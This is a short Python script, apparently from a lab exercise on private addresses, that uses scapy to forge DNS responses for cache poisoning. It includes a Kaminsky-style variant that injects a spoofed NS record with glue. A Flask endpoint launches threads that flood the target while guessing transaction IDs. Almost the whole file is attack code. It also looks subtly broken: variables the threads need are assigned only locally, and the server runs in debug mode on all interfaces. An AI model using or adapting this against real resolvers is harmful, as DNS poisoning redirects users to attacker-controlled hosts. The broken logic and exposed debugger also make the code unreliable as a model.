from scapy.all import *
from flask import Flask, request
import threading

app = Flask(__name__)
src_ip_dns = 	"192.168.0.10"
src_ip = 	"192.168.0.100"
mal_ip_dns = 	"192.168.0.150"
mal_ip = 	"192.168.0.151"
dst_ip = 	"192.168.0.200"

src_port = 53
dst_port = 6666

website = 	"trusted.website.com"
dnswebsite =	"dnswebsite.website.com"
ttl = 600000


# precompute standard object
response_c = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=ttl, rdata=mal_ip)))

# kaminsky
response_k = (IP(dst=dst_ip, src=src_ip_dns)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1, 
		aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=ttl, rdata=dnswebsite), 
		ar=DNSRR(rrname=dnswebsite, type='A', ttl=ttl, rdata=mal_ip_dns)))

# dynamic var
dns_layer = None
response  = None

s = conf.L3socket()


def attack(start):
	for i in range(start, start + 500, 1):
		dns_layer.id = i % 65000
		s.send(response)


@app.route('/', methods=['GET'])
def start_attack():
	
	if request.args.get('attack') == 'k':
		dns_layer = response_k[DNS]
		response  = response_k
	else:
		dns_layer = response_c[DNS]
		response  = response_c
	
	
	qid = int(request.args.get('start_qid'))
	for i in range(0, 20, 1):
		threading.Thread(target=attack, args=(qid,)).start()
		qid += 500


if __name__ == "__main__":
	app.run(debug = True, host = '0.0.0.0', port = 8888)

